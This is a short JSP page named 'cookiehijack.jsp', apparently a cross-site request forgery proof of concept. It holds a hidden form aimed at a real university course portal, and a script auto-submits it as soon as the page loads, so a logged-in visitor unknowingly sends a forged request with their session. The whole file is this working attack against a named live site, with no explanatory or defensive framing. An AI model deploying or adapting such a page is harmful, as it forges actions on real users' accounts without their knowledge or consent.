<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <base href="<%=basePath%>">
    
    <title>My JSP 'cookiehijack.jsp' starting page</title>
    
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">    
	<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
	<meta http-equiv="description" content="This is my page">
	<!--
	<link rel="stylesheet" type="text/css" href="styles.css">
	-->
	<script src="https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"></script>
  </head>
  
  <body>
    This is my JSP page. <br>
    <form id="hijack" method="post" action="https://course.ucas.ac.cn/portal/plogin/main.do?method=gotoOuterMain">
    	<input type="hidden" name="type" value="active">
    	<input type="hidden" name="siteId" value="%E5%85%AC%E5%85%B1%E6%94%BF%E7%AD%96%E4%B8%8E%E7%AE%A1%E7%90%86%E5%AD%A6%E9%99%A2">
    	<input type="hidden" name="searchText" value="">
    	<input type="hidden" name="termEid" value="">
    	<button type="submit">click me!</button>
    </form>
    
    <script type="text/javascript">
    	$(document).ready(function(){
    		var str = "2017 04"
    		$("input[name = 'termEid']").val();
    		$("form#hijack button").click();
    	});   	
    </script>
  </body>
</html>
